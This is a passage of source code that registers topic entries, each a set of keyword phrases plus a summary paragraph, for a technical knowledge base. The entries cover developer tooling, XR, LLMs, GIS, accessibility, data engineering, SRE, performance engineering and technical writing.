  add('devtools_build', ['docker compose container development environment', 'devcontainer codespace remote development vscode', 'nix flake reproducible development environment'],
    'Development environments: Docker Compose — multi-container dev setup (app, database, cache, queue). Volume mounts for live reload. Dev containers (VS Code): .devcontainer/devcontainer.json, consistent environment, GitHub Codespaces. Nix — reproducible builds, flakes for project dependencies. DevEnv — Nix-based dev environments. Vagrant — VM-based dev environments. Environment variables: dotenv (.env files), direnv (auto-load per directory). Tool version management: asdf (multi-language), nvm (Node), pyenv (Python), rbenv (Ruby), volta (Node, faster). Mise — polyglot tool version manager.', 0.8)

  add('devtools_build', ['git hooks husky lint staged pre commit', 'github actions ci cd workflow automation', 'pre commit framework code quality gate check'],
    'Git hooks & CI: Husky — Git hooks manager (pre-commit, pre-push, commit-msg). lint-staged — run linters on staged files only (fast). Commitlint — enforce conventional commits. Pre-commit framework (Python): multi-language hooks. Git hooks: pre-commit (lint, format, test), commit-msg (validate message), pre-push (full test). CI/CD: GitHub Actions (workflows, jobs, steps, matrix), GitLab CI (.gitlab-ci.yml), Jenkins (Jenkinsfile), CircleCI. Best practices: fail fast, cache dependencies, parallel jobs, branch protection, required checks. Artifact caching, incremental builds.', 0.85)

  add('devtools_build', ['chrome devtools debugging performance profiler', 'react devtools vue devtools browser extension', 'lighthouse web vitals performance audit tool'],
    'Browser DevTools: Chrome DevTools — Elements (DOM/CSS), Console, Sources (debugger, breakpoints, conditional), Network (waterfall, throttle), Performance (flame chart, CPU profiling), Memory (heap snapshot, allocation timeline), Application (storage, service workers, cache). React DevTools: component tree, props/state, profiler (render times). Vue DevTools: component inspector, Vuex/Pinia state, router. Lighthouse: performance audits, accessibility, SEO, best practices, PWA. Web Vitals: LCP (Largest Contentful Paint), FID/INP (interaction), CLS (layout shift). Tools: WebPageTest, PageSpeed Insights.', 0.8)

  // ── AR/VR/XR Development ──────────────────────────────────────────────
  add('arvr_xr', ['webxr virtual reality augmented reality browser', 'threejs 3d scene renderer camera webgl', 'aframe vr framework declarative html web'],
    'Web-based XR: WebXR Device API — access VR/AR devices from browser. Sessions: immersive-vr (headset), immersive-ar (passthrough), inline (2D). Reference spaces: local, local-floor, bounded-floor, unbounded. Three.js — 3D library: Scene, Camera (Perspective/Orthographic), Renderer (WebGLRenderer), Mesh (Geometry + Material), Light, Controls (OrbitControls). A-Frame — declarative VR framework: HTML-like entities (<a-scene>, <a-box>, <a-sky>), component system, works with Three.js. Babylon.js — full 3D engine, physics, GUI, XR support. Model formats: glTF/GLB (standard), USDZ (Apple).', 0.9)

  add('arvr_xr', ['unity vr development xr interaction toolkit', 'unreal engine vr development blueprint visual', 'openxr standard cross platform vr ar runtime'],
    'Native XR development: Unity — XR Interaction Toolkit, Universal Render Pipeline (URP), XR Plugin Management, multi-platform (Quest, PCVR, mobile AR). C# scripting. AR Foundation: ARKit (iOS) + ARCore (Android) unified API. Unreal Engine — high-fidelity VR, Blueprint visual scripting, Nanite (virtualized geometry), Lumen (global illumination). OpenXR — cross-platform XR standard, one API for multiple runtimes (Oculus, SteamVR, Windows MR). VR interaction: teleportation, continuous locomotion, grab/throw, ray interaction, hand tracking (Quest, Leap Motion).', 0.85)

  add('arvr_xr', ['spatial computing apple vision pro visionos', 'mixed reality hololens passthrough spatial anchor', 'hand tracking gesture recognition spatial input'],
    'Spatial computing: Apple Vision Pro — visionOS, SwiftUI for spatial apps, RealityKit (3D framework), Reality Composer Pro, spatial personas. Windows/volumes/spaces paradigm. Microsoft HoloLens — mixed reality, Azure Spatial Anchors (shared world), Mesh (collaborative). Meta Quest — passthrough MR, Scene Understanding, Depth API, Spatial Anchors. Hand tracking: skeleton tracking (21 joints per hand), pinch/grab gestures, controller-free interaction. Eye tracking: foveated rendering (render high quality where looking), gaze interaction, attention analytics. Spatial audio: HRTF (Head-Related Transfer Function), ambisonics.', 0.85)

  add('arvr_xr', ['augmented reality arkit arcore surface detection', 'marker tracking image recognition ar overlay', 'slam simultaneous localization mapping ar tracking'],
    'Augmented Reality: ARKit (iOS) — world tracking, plane detection, image/object recognition, face tracking (TrueDepth), body tracking, LiDAR scanning, scene reconstruction. ARCore (Android) — motion tracking, environmental understanding, light estimation, depth API, geospatial API (Google Maps). SLAM (Simultaneous Localization and Mapping): visual-inertial odometry, feature point tracking, map building. Marker-based AR: ArUco markers, QR codes, image targets. Markerless AR: surface detection, object recognition. Frameworks: Vuforia, 8th Wall (web AR), Spark AR (Meta), Lens Studio (Snap).', 0.85)

  add('arvr_xr', ['vr performance optimization foveated rendering', 'motion sickness comfort vr locomotion design', 'xr accessibility inclusive design universal access'],
    'XR performance & UX: Performance targets — 72-120 FPS (Quest: 72/90/120Hz, PCVR: 90-144Hz). Foveated rendering: fixed (render edges at lower res) or dynamic (eye-tracked). Single-pass stereo rendering. Level of detail (LOD). Occlusion culling. Draw call batching. Motion sickness prevention: maintain framerate, avoid vection (perceived self-motion), provide stable reference points, snap turning, vignette during movement, comfort modes. Accessibility: subtitles, audio descriptions, one-handed controls, seated mode, color-blind options, adjustable text size, haptic feedback alternatives.', 0.8)

  // ── LLM & Prompt Engineering ──────────────────────────────────────────
  add('llm_prompt_engineering', ['large language model gpt claude llama gemini', 'transformer attention mechanism self attention', 'tokenizer bpe sentencepiece vocabulary encoding'],
    'Large Language Models: GPT (OpenAI: GPT-4, GPT-4o), Claude (Anthropic: Claude 3.5 Sonnet/Opus), Llama (Meta: Llama 3), Gemini (Google: Gemini Pro/Ultra), Mistral (Mistral AI: Mixtral MoE). Architecture: Transformer — self-attention mechanism, multi-head attention, positional encoding, feed-forward layers. Tokenization: BPE (Byte Pair Encoding, GPT), SentencePiece (Llama), tiktoken. Context window: 4K-200K+ tokens. Parameters: billions (7B, 13B, 70B, 175B). Training: pre-training (next token prediction on web corpus) → fine-tuning (SFT, supervised) → alignment (RLHF, DPO, Constitutional AI).', 0.9)

  add('llm_prompt_engineering', ['prompt engineering chain of thought few shot', 'system prompt instruction template formatting', 'zero shot few shot in context learning example'],
    'Prompt engineering techniques: Zero-shot (no examples), Few-shot (examples in prompt), Chain-of-Thought (CoT: "Let\'s think step by step"), Tree-of-Thought (explore multiple reasoning paths). System prompts: set role, constraints, output format. Prompt templates: structured instructions, input/output format, examples. ReAct (Reasoning + Acting): interleave thought and action. Self-consistency: multiple reasoning paths, majority vote. Prompt chaining: break complex tasks into subtasks. Constitutional AI: self-critique and revision. Best practices: be specific, provide context, use delimiters, specify output format, iterate and test.', 0.9)

  add('llm_prompt_engineering', ['rag retrieval augmented generation knowledge base', 'vector database embedding similarity search', 'langchain llamaindex llm framework orchestration'],
    'RAG (Retrieval-Augmented Generation): retrieve relevant documents → augment prompt → generate answer. Pipeline: query → embed → vector search → top-k retrieval → rerank → prompt construction → LLM generation. Vector databases: Pinecone (managed), Weaviate (open-source, GraphQL), ChromaDB (lightweight), Qdrant (Rust, fast), Milvus (scalable), pgvector (PostgreSQL extension). Embeddings: OpenAI text-embedding-3, sentence-transformers, BGE, E5. Frameworks: LangChain (chains, agents, tools, memory), LlamaIndex (data connectors, indexing strategies), Haystack (NLP pipelines). Chunking strategies: fixed-size, recursive, semantic.', 0.9)

  add('llm_prompt_engineering', ['fine-tuning', 'lora', 'qlora', 'peft', 'parameter efficient', 'rlhf', 'dpo', 'instruction tuning', 'sft'],
    'LLM fine-tuning: Full fine-tuning — update all parameters (expensive, needs lots of data). LoRA (Low-Rank Adaptation): add trainable low-rank matrices to frozen model, 10-100x fewer parameters. QLoRA: quantized LoRA (4-bit base model, train LoRA adapters). PEFT (Parameter-Efficient Fine-Tuning): LoRA, prefix-tuning, prompt-tuning. SFT (Supervised Fine-Tuning): instruction-response pairs, Alpaca/ShareGPT format. RLHF: train reward model from human preferences → PPO optimization. DPO (Direct Preference Optimization): simpler alternative to RLHF. Tools: Hugging Face Transformers, PEFT, TRL (Transformer Reinforcement Learning), Axolotl, Unsloth (fast LoRA).', 1.1)

  add('llm_prompt_engineering', ['ai agent tool use function calling automation', 'multi agent system collaboration orchestration', 'llm evaluation benchmark hallucination detection'],
    'AI agents & evaluation: Function calling — LLM selects and calls tools (APIs, databases, code execution). Agent frameworks: AutoGPT, CrewAI (multi-agent, roles), LangGraph (stateful workflows), Semantic Kernel (Microsoft). Multi-agent: specialized agents collaborate (researcher, coder, reviewer). Planning: ReAct, Plan-and-Execute. Memory: short-term (conversation), long-term (vector store). Guardrails: content filtering, output validation, rate limiting. Evaluation: MMLU (knowledge), HumanEval (coding), MT-Bench (conversation), HELM. Hallucination detection: factual consistency, source attribution, confidence calibration. Safety: red teaming, adversarial testing.', 0.85)

  add('llm_prompt_engineering', ['local llm inference ollama llama cpp gguf', 'model quantization int8 int4 gptq awq', 'llm deployment serving vllm tgi inference'],
    'Local LLM & deployment: Ollama — run LLMs locally (pull models, API server, Modelfile). llama.cpp — C++ inference, GGUF format (quantized models), CPU/GPU. Quantization: INT8 (8-bit), INT4 (4-bit) — reduce memory/speed with minimal quality loss. Methods: GPTQ (post-training, GPU), AWQ (activation-aware), GGUF (llama.cpp, CPU-friendly), bitsandbytes (on-the-fly). Serving: vLLM (PagedAttention, continuous batching, high throughput), TGI (Hugging Face Text Generation Inference), TensorRT-LLM (NVIDIA, optimized). Deployment: API endpoint, streaming (SSE), OpenAI-compatible API. Scaling: KV-cache optimization, speculative decoding, prefix caching.', 0.85)

  // ── Geospatial & GIS ──────────────────────────────────────────────────
  add('geospatial_gis', ['leaflet mapbox openlayers interactive web map', 'google maps api maplibre geolocation mapping', 'cesium deck gl 3d globe visualization tiles'],
    'Web mapping libraries: Leaflet — lightweight, open-source, tiles (OpenStreetMap, Mapbox), markers, popups, GeoJSON layers, plugins ecosystem. Mapbox GL JS — vector tiles, custom styles (Mapbox Studio), 3D terrain, data-driven styling. MapLibre GL — open-source fork of Mapbox GL. OpenLayers — full-featured, OGC standards support (WMS, WFS, WMTS). Google Maps API — Places, Directions, Geocoding, Street View. Deck.gl (Uber): WebGL-powered large-scale data visualization on maps. CesiumJS — 3D globes, terrain, 3D Tiles (buildings, point clouds). Tile formats: raster (PNG/JPEG), vector (MVT/PBF). Styling: SLD, Mapbox Style Spec.', 0.9)

  add('geospatial_gis', ['postgis spatial database geography geometry', 'spatial query intersection buffer distance within', 'geojson topojson shapefile spatial data format'],
    'Spatial databases & formats: PostGIS — PostgreSQL extension, geometry/geography types, spatial indexes (GiST, SP-GiST), spatial SQL (ST_Contains, ST_Distance, ST_Buffer, ST_Intersects, ST_Within, ST_Union). SpatiaLite (SQLite spatial). Data formats: GeoJSON (web standard, FeatureCollection/Feature/Geometry), TopoJSON (topology-encoded, smaller), Shapefile (Esri legacy, .shp/.dbf/.shx), GeoPackage (OGC, SQLite-based), KML (Google Earth), WKT/WKB (Well-Known Text/Binary). Coordinate Reference Systems: WGS84 (EPSG:4326, lat/lon), Web Mercator (EPSG:3857, maps). PROJ library for transformations.', 0.85)

  add('geospatial_gis', ['geocoding reverse geocoding address coordinates', 'routing directions isochrone navigation algorithm', 'geofencing location tracking proximity detection'],
    'Geospatial services: Geocoding — address to coordinates (forward), coordinates to address (reverse). Providers: Nominatim (OSM, free), Google Geocoding API, Mapbox Geocoding, HERE. Routing: shortest/fastest path, turn-by-turn directions. Engines: OSRM (fast, OpenStreetMap), Valhalla (multimodal), GraphHopper (Java), Google Directions API. Isochrones: area reachable within time/distance. Geofencing: virtual boundaries, enter/exit events. Use cases: delivery zones, asset tracking, proximity alerts. Location tracking: GPS, Wi-Fi positioning, cell tower triangulation. Privacy: consent, data minimization, anonymization.', 0.85)

  add('geospatial_gis', ['gis qgis arcgis desktop analysis remote sensing', 'satellite imagery raster analysis dem elevation', 'spatial analysis overlay network geostatistics'],
    'GIS analysis: QGIS — open-source desktop GIS, vector/raster analysis, plugins (Python), layouts/maps. ArcGIS — Esri commercial, ArcGIS Pro (desktop), ArcGIS Online (cloud), ArcPy (Python). Remote sensing: satellite imagery (Sentinel, Landsat), spectral bands (RGB, NIR, SWIR), NDVI (vegetation index). Raster analysis: DEM (Digital Elevation Model), hillshade, slope, aspect, viewshed. Spatial analysis operations: buffer, overlay (union, intersect, difference), Voronoi/Thiessen polygons, nearest neighbor, spatial join, hotspot analysis (Getis-Ord Gi*), kriging (interpolation). GDAL/OGR: geospatial data abstraction library. Python: geopandas, rasterio, shapely, fiona.', 0.8)

  add('geospatial_gis', ['turf js geospatial analysis javascript browser', 'h3 uber hexagonal spatial indexing grid', 'osm openstreetmap data overpass api planet'],
    'Geospatial tools & data: Turf.js — geospatial analysis in JavaScript (browser/Node): measurement (distance, area, centroid), transformation (buffer, simplify, dissolve), classification (nearest point, tin), Boolean operations. H3 (Uber): hierarchical hexagonal grid system, spatial indexing, aggregation at multiple resolutions. S2 Geometry (Google): sphere-based spatial indexing. OpenStreetMap (OSM): free, editable world map. Overpass API: query OSM data. Planet file: complete OSM data dump. Tile servers: OpenMapTiles, Planetiler. 3D: CityGML, 3D Tiles (Cesium), OSM Buildings. Point clouds: LAS/LAZ format, LiDAR processing (PDAL).', 0.8)

  // ── Accessibility (a11y) ──────────────────────────────────────────────
  add('accessibility_a11y', ['wcag web content accessibility guidelines level', 'aria role attribute landmark live region', 'screen reader nvda jaws voiceover assistive'],
    'Web accessibility standards: WCAG 2.1/2.2 (Web Content Accessibility Guidelines) — Level A (minimum), AA (standard target), AAA (enhanced). Four principles (POUR): Perceivable, Operable, Understandable, Robust. Success criteria: text alternatives (1.1.1), captions (1.2.2), contrast ratio (1.4.3 — 4.5:1 normal text, 3:1 large), keyboard accessible (2.1.1), focus visible (2.4.7), error identification (3.3.1). WAI-ARIA: roles (button, dialog, tab, alert), properties (aria-label, aria-describedby, aria-expanded), states (aria-selected, aria-disabled), landmarks (banner, main, navigation, complementary), live regions (aria-live="polite/assertive").', 0.9)

  add('accessibility_a11y', ['keyboard navigation focus management tab order', 'skip link focus trap modal dialog accessible', 'accessible form label error validation input'],
    'Keyboard accessibility: Tab order (tabindex: 0 = natural, -1 = programmatic, positive = custom order — avoid!). Skip links: "Skip to main content" (first focusable element). Focus management: move focus on route change (SPA), trap focus in modals (focus-trap library), return focus on close. Focus indicators: visible outline (never outline:none without alternative). Accessible forms: <label> associated with <input> (for/id or wrapping), required fields (aria-required), error messages linked (aria-describedby, aria-invalid), group related fields (<fieldset>/<legend>). Autocomplete attributes.', 0.85)

  add('accessibility_a11y', ['color contrast ratio accessible palette design', 'responsive accessible mobile touch target size', 'cognitive accessibility plain language readability'],
    'Visual & cognitive accessibility: Color contrast — WCAG AA: 4.5:1 (normal text), 3:1 (large text ≥18pt/14pt bold). AAA: 7:1/4.5:1. Tools: WebAIM Contrast Checker, axe DevTools. Don\'t rely on color alone (use icons, patterns, text). Color-blind safe palettes (avoid red/green only). Touch targets: minimum 44×44px (WCAG), 48×48dp (Material). Responsive: zoom to 200% without loss. Text spacing: adjustable line-height, letter-spacing, word-spacing. Cognitive: plain language, consistent navigation, clear headings, avoid auto-playing media, provide enough time, break up long content, clear error messages with suggestions.', 0.85)

  add('accessibility_a11y', ['axe core testing tool accessibility audit', 'jest axe testing library a11y automated test', 'lighthouse accessibility score chrome devtools'],
    'Accessibility testing: Automated tools — axe-core (Deque, rule engine, 30-40% of issues), axe DevTools (browser extension), Lighthouse (Chrome, accessibility audit score). Testing libraries: jest-axe (automated a11y in unit tests), @axe-core/react, cypress-axe, playwright axe. eslint-plugin-jsx-a11y: static analysis for React JSX. Manual testing: keyboard-only navigation, screen reader testing (VoiceOver macOS, NVDA Windows free, JAWS Windows commercial, TalkBack Android). Browser tools: Chrome Accessibility tab, Firefox Accessibility Inspector. Accessibility tree: browser\'s representation of page for assistive tech. Pa11y: CI/CD accessibility testing.', 0.85)

  add('accessibility_a11y', ['semantic html heading structure document outline', 'alt text image description accessible media', 'accessible component library react aria radix ui'],
    'Semantic HTML & components: Use semantic elements: <header>, <nav>, <main>, <article>, <section>, <aside>, <footer>. Heading hierarchy: one <h1>, logical nesting (h2→h3, don\'t skip). Images: meaningful alt text (describe content/function), decorative images (alt="" or CSS background). Media: captions (video), transcripts (audio/video), audio descriptions. Tables: <th>, scope, <caption>. Accessible component libraries: React Aria (Adobe, hooks-based, headless), Radix UI (unstyled, accessible primitives), Reach UI, Headless UI (Tailwind Labs). WAI-ARIA Authoring Practices: patterns for tabs, accordions, comboboxes, menus, tree views, dialogs.', 0.85)

  add('accessibility_a11y', ['inclusive design universal design disability', 'assistive technology screen magnifier switch', 'accessibility compliance legal section 508 ada'],
    'Inclusive design & compliance: Inclusive design principles — recognize exclusion, solve for one extend to many, learn from diversity. Disability types: visual (blind, low vision, color blind), auditory (deaf, hard of hearing), motor (limited dexterity, tremors), cognitive (learning disabilities, attention). Assistive technologies: screen readers, screen magnifiers (ZoomText), switch devices, eye tracking, voice control (Dragon NaturallySpeaking). Legal: ADA (Americans with Disabilities Act), Section 508 (US federal), EN 301 549 (EU), Accessibility Act (EU 2025). VPAT (Voluntary Product Accessibility Template). Overlay tools: generally ineffective and controversial.', 0.8)

  // ── Data Engineering / ETL ───────────────────────────────────────────────────
  add('data_engineering', ['apache spark distributed data processing rdd dataframe', 'spark sql catalyst optimizer query execution plan', 'pyspark structured streaming micro batch continuous'],
    'Apache Spark: Distributed computing engine for large-scale data processing. Core abstraction: RDD (Resilient Distributed Dataset) → immutable, partitioned, fault-tolerant. Modern API: DataFrames/Datasets with Catalyst optimizer for SQL-like queries. Spark SQL: Hive-compatible, supports Parquet/ORC/Avro. Structured Streaming: micro-batch (100ms latency) or continuous processing. Spark MLlib for distributed ML. Deploy on YARN, Kubernetes, Mesos, or standalone. Key tuning: partition count, memory/executor config, broadcast joins, AQE (Adaptive Query Execution).', 1.1)

  add('data_engineering', ['airflow dag directed acyclic graph workflow orchestration', 'data pipeline scheduling task dependency management', 'prefect dagster orchestration modern workflow'],
    'Workflow orchestration: Apache Airflow — define DAGs (Directed Acyclic Graphs) in Python for pipeline scheduling. Operators: BashOperator, PythonOperator, sensors, transfers. XComs for inter-task communication. Executors: Local, Celery, Kubernetes. Alternatives: Prefect (Pythonic, dynamic DAGs), Dagster (asset-based, type-safe), Luigi (simpler). Key patterns: idempotent tasks, backfill support, SLA monitoring, retry policies, dead-letter queues. Best practice: separate orchestration from transformation logic.', 1.1)

  add('data_engineering', ['dbt data build tool transformation analytics engineering', 'elt extract load transform modern data stack', 'data warehouse snowflake bigquery redshift lakehouse'],
    'Modern data stack: dbt (data build tool) — SQL-first transformation in the warehouse. Models as SELECT statements, ref() for dependencies, tests for data quality, documentation generation. ELT pattern: Extract → Load raw → Transform in warehouse (vs traditional ETL). Warehouses: Snowflake (multi-cluster, separation of compute/storage), BigQuery (serverless, columnar), Redshift (MPP, Spectrum for S3). Lakehouse: Delta Lake, Apache Iceberg, Apache Hudi — ACID transactions on data lakes. Formats: Parquet (columnar, compressed), ORC, Avro (schema evolution).', 1.1)

  add('data_engineering', ['kafka streams event streaming real time processing', 'data lake delta lake iceberg hudi table format', 'schema evolution registry avro protobuf backward compatible'],
    'Event streaming & schema management: Kafka Streams — lightweight stream processing library (no separate cluster). Concepts: KStream (event stream), KTable (changelog), joins, windowing (tumbling, hopping, session). Schema Registry: Avro/Protobuf/JSON Schema versioning. Compatibility modes: BACKWARD (new schema reads old data), FORWARD (old schema reads new data), FULL. Data lake table formats: Delta Lake (Databricks, time travel, MERGE), Iceberg (Netflix, hidden partitioning, schema evolution), Hudi (Uber, incremental processing). CDC (Change Data Capture): Debezium for database→Kafka streaming.', 1.0)

  add('data_engineering', ['data quality testing great expectations validation', 'data lineage metadata catalog governance', 'batch processing etl pipeline spark flink beam'],
    'Data quality & governance: Great Expectations — data validation framework (expectations as tests, data docs, checkpoints). Alternatives: Soda, dbt tests, Monte Carlo (observability). Data lineage: track data flow from source→transformation→destination. Metadata catalogs: Apache Atlas, Amundsen, DataHub, OpenMetadata. Data governance: access control, PII classification, retention policies. Batch engines: Spark (dominant), Flink (true streaming + batch), Apache Beam (unified API, runners for Spark/Flink/Dataflow). ETL anti-patterns: monolithic pipelines, no idempotency, missing data validation.', 1.0)

  add('data_engineering', ['data pipeline design pattern medallion bronze silver gold', 'dimensional modeling star schema fact dimension table', 'data mesh domain oriented decentralized architecture'],
    'Data architecture patterns: Medallion architecture — Bronze (raw ingestion), Silver (cleaned, conformed), Gold (business-level aggregates). Dimensional modeling (Kimball): star schema with fact tables (measures) and dimension tables (context). Slowly changing dimensions (SCD Type 1/2/3). Data Vault: hub-satellite-link for historical tracking. Data mesh: domain-oriented decentralized ownership, data as a product, self-serve platform, federated governance. Lambda architecture: batch + speed layers (largely superseded by Kappa/streaming-first). Key metrics: data freshness, completeness, accuracy, consistency.', 1.0)

  // ── Site Reliability Engineering (SRE) ──────────────────────────────────────
  add('sre', ['sli slo sla service level indicator objective agreement', 'error budget reliability target uptime nines', 'sre site reliability engineering google practices'],
    'SRE fundamentals: Service Level Indicators (SLIs) — quantitative measures of service (latency p99, error rate, throughput). Service Level Objectives (SLOs) — target values for SLIs (e.g., 99.9% availability = 8.76h downtime/year). Service Level Agreements (SLAs) — contractual commitments with consequences. Error budget = 1 - SLO (e.g., 0.1% for 99.9%). When budget exhausted: freeze deployments, focus on reliability. Google SRE principles: embrace risk, eliminate toil, monitor meaningfully, automate everything, release engineering, simplicity.', 1.1)

  add('sre', ['incident management response postmortem blameless review', 'on call rotation escalation runbook playbook', 'incident commander communication stakeholder update'],
    'Incident management: Severity levels (SEV1-4) with escalation paths. Incident Commander (IC) coordinates response. Roles: IC, Communications Lead, Operations Lead, Subject Matter Experts. Runbooks/playbooks: step-by-step remediation procedures. War rooms for SEV1/2. Status pages: Statuspage.io, Cachet. Post-incident: blameless postmortems — timeline, root cause, contributing factors, action items. Format: What happened? Why? How to prevent? Action items with owners and deadlines. On-call: rotation schedules, escalation policies, PagerDuty/OpsGenie/VictorOps.', 1.0)

  add('sre', ['chaos engineering resilience testing fault injection', 'chaos monkey gameday failure experiment hypothesis', 'reliability testing disaster recovery failover'],
    'Chaos engineering: Discipline of experimenting on systems to build confidence in resilience. Process: steady state hypothesis → introduce failure → observe → learn. Tools: Chaos Monkey (Netflix, random instance termination), Gremlin (enterprise chaos), Litmus (Kubernetes-native), AWS Fault Injection Simulator. Game Days: planned chaos experiments with team. Types: infrastructure (kill instances, network partition), application (latency injection, error injection), dependency (upstream/downstream failures). Disaster recovery: RPO (Recovery Point Objective), RTO (Recovery Time Objective). DR strategies: backup/restore, pilot light, warm standby, multi-site active-active.', 1.0)

  add('sre', ['toil reduction automation operational work repetitive', 'capacity planning scaling autoscaling resource management', 'release engineering deployment canary blue green rolling'],
    'Toil & release engineering: Toil — manual, repetitive, automatable, tactical operational work. Goal: keep toil <50% of SRE time. Automation ladder: manual → documented → scripted → self-service → fully automated. Capacity planning: organic growth forecasting, inorganic (launches), load testing for headroom. Release engineering: CI/CD pipelines, canary releases (gradual rollout with metrics comparison), blue-green deployments (instant switchover), rolling updates (zero-downtime). Feature flags for decoupling deployment from release. Rollback strategies: code rollback, config rollback, data rollback.', 1.0)

  add('sre', ['observability three pillars metrics logs traces', 'alerting fatigue noise reduction actionable alerts', 'sre culture reliability engineering team structure'],
    'SRE observability & culture: Three pillars — metrics (aggregated numerical data), logs (discrete events), traces (request flows across services). Golden signals: latency, traffic, errors, saturation. RED method: Rate, Errors, Duration. USE method: Utilization, Saturation, Errors. Alert best practices: actionable, low-noise, symptom-based (not cause-based), with runbook links. Alert fatigue: too many alerts = ignored alerts. SRE team models: embedded (within product teams), centralized (platform team), or hybrid. Production readiness reviews before launch.', 1.0)

  // ── Performance Engineering ─────────────────────────────────────────────────
  add('performance_engineering', ['profiling cpu memory flame graph hot path bottleneck', 'performance profiler chrome devtools node inspect', 'cpu profiling sampling instrumentation call stack analysis'],
    'Performance profiling: CPU profiling — sampling (periodic stack snapshots, low overhead) vs instrumentation (every function call, high overhead). Flame graphs: visualize call stacks (width = time spent). Tools: Chrome DevTools Performance tab, Node.js --inspect + clinic.js, perf (Linux), py-spy (Python), async-profiler (Java). Memory profiling: heap snapshots, allocation tracking, leak detection. Chrome Memory tab: heap snapshot, allocation timeline, allocation sampling. Key metrics: CPU time vs wall time, function self-time vs total time, hot paths (most time-consuming code paths).', 1.1)

  add('performance_engineering', ['benchmarking load testing performance test jmeter k6', 'stress testing soak testing spike testing capacity', 'gatling locust wrk artillery performance tool'],
    'Load & stress testing: Types — load test (expected traffic), stress test (beyond capacity), soak test (sustained load, find leaks), spike test (sudden traffic burst), capacity test (find breaking point). Tools: k6 (JavaScript, developer-friendly), JMeter (Java, GUI + CLI), Gatling (Scala, code-first), Locust (Python, distributed), Artillery (Node.js, YAML config), wrk/wrk2 (HTTP benchmarking). Methodology: establish baseline, define SLOs, ramp up gradually, monitor all layers, identify bottlenecks. Metrics: throughput (RPS), latency percentiles (p50/p95/p99), error rate, resource utilization.', 1.0)

  add('performance_engineering', ['caching strategy redis memcached cdn cache invalidation', 'cache aside write through write behind read through', 'browser cache http cache etag last modified expires'],
    'Caching strategies: Patterns — cache-aside (lazy load, app manages cache), read-through (cache manages data source reads), write-through (synchronous write to cache + DB), write-behind (async write to DB). Eviction: LRU (Least Recently Used), LFU (Least Frequently Used), TTL-based. Layers: browser cache (Cache-Control, ETag, Last-Modified), CDN (edge caching, Cloudflare/Fastly/CloudFront), application cache (Redis, Memcached), database cache (query cache, buffer pool). Cache invalidation: TTL, event-based, versioned keys. Redis: in-memory, data structures, pub/sub, Lua scripting, cluster mode.', 1.0)

  add('performance_engineering', ['memory optimization garbage collection heap allocation', 'memory leak detection object pooling buffer reuse', 'latency optimization p99 tail latency response time'],
    'Memory & latency optimization: Memory — object pooling (reuse expensive objects), buffer reuse, string interning, lazy initialization, weak references for caches. GC tuning: generational GC (young/old gen), G1GC (Java), V8 GC (Node.js Scavenge + Mark-Sweep-Compact). Memory leaks: unbounded caches, event listener accumulation, closures retaining references, circular references. Latency: tail latency (p99/p999) often matters more than average. Techniques: connection pooling, request coalescing, prefetching, async I/O, batch processing, denormalization, index optimization.', 1.0)

  add('performance_engineering', ['database query optimization indexing explain plan', 'n plus one query problem eager loading batch query', 'web performance core web vitals lcp fid cls ttfb'],
    'Query & web performance: Database — EXPLAIN/EXPLAIN ANALYZE for query plans. Index types: B-tree (range), hash (equality), GIN (full-text), partial indexes. N+1 problem: eager loading (JOIN), batch loading, DataLoader pattern. Query optimization: avoid SELECT *, use covering indexes, partition large tables, materialized views. Web Core Vitals: LCP (Largest Contentful Paint <2.5s), FID/INP (First Input Delay/Interaction to Next Paint <200ms), CLS (Cumulative Layout Shift <0.1). TTFB (Time to First Byte). Techniques: code splitting, lazy loading, image optimization (WebP/AVIF), critical CSS inlining, preload/prefetch hints.', 1.0)

  // ── Technical Writing / Documentation ───────────────────────────────────────
  add('technical_writing', ['api documentation openapi swagger reference guide', 'documentation generator jsdoc typedoc rustdoc sphinx', 'readme changelog contributing guide project docs'],
    'API & project documentation: OpenAPI/Swagger — machine-readable REST API specs (YAML/JSON), auto-generate docs (Swagger UI, Redoc), client SDKs, and server stubs. Tools: JSDoc (JavaScript), TypeDoc (TypeScript), Rustdoc (Rust), Sphinx (Python), Javadoc (Java), Godoc (Go). README essentials: project description, installation, quick start, usage examples, contributing guidelines, license. CHANGELOG: follow Keep a Changelog format (Added/Changed/Deprecated/Removed/Fixed/Security). CONTRIBUTING.md: code style, PR process, issue templates, development setup.', 1.0)

  add('technical_writing', ['architecture decision record adr design document rfc', 'technical specification system design document template', 'design review process proposal approval workflow'],
    'Architecture documentation: ADR (Architecture Decision Record) — captures context, decision, consequences for significant choices. Format: Title, Status, Context, Decision, Consequences. Tools: adr-tools, Log4brains, Markdown ADRs in repo. RFC (Request for Comments) process for larger changes — problem statement, proposed solution, alternatives, timeline. Design documents: goals, non-goals, background, detailed design, alternatives considered, security/privacy, testing plan. C4 model: Context, Container, Component, Code — four levels of system documentation from high-level to detailed.', 1.0)

  add('technical_writing', ['mermaid plantuml diagram as code architecture diagram', 'sequence diagram flowchart class diagram entity relationship', 'documentation site docusaurus mkdocs gitbook vitepress'],
    'Diagramming & doc sites: Diagram-as-code — Mermaid (Markdown-embeddable, GitHub-rendered: flowcharts, sequence, class, ER, Gantt), PlantUML (Java-based, comprehensive UML), Excalidraw (hand-drawn style), D2 (declarative). Diagram types: sequence (interactions), flowchart (processes), class (OOP), ER (database), state machine, deployment. Doc platforms: Docusaurus (React, MDX, versioning), MkDocs + Material theme (Python, beautiful), VitePress (Vue-based, fast), GitBook (commercial), Confluence (enterprise). Docs-as-code: docs in repo, reviewed in PRs, CI/CD deployed.', 1.0)

  add('technical_writing', ['tutorial howto guide writing structure beginner', 'code example sample snippet documentation best practice', 'technical writing style clarity conciseness audience'],
    'Writing best practices: Divio documentation system — tutorials (learning-oriented), how-to guides (task-oriented), explanation (understanding-oriented), reference (information-oriented). Writing style: active voice, second person ("you"), short sentences, consistent terminology, progressive disclosure. Code examples: complete (copy-pasteable), tested, with expected output, error handling shown. Audience analysis: beginner (concepts first), intermediate (patterns + gotchas), expert (edge cases + internals). Review checklist: accuracy, completeness, clarity, code tested, links valid, screenshots current.', 1.0)

  add('technical_writing', ['versioned documentation release notes migration guide', 'internationalization i18n translation documentation locale', 'documentation testing broken links spelling grammar'],
    'Doc lifecycle & quality: Versioned docs: match documentation to software versions (Docusaurus versioning, ReadTheDocs versions). Release notes: user-facing summary of changes per version, migration guides for breaking changes. Internationalization: crowdin, Transifex, or manual translation workflows. Locale-specific examples and screenshots. Documentation testing: broken link checkers (markdown-link-check), spell checkers (cspell, aspell), linters (markdownlint, vale), screenshot automation (Playwright). Freshness: documentation review cadence, ownership per section, "last reviewed" timestamps. Metrics: page views, search queries, feedback ratings.', 0.9)

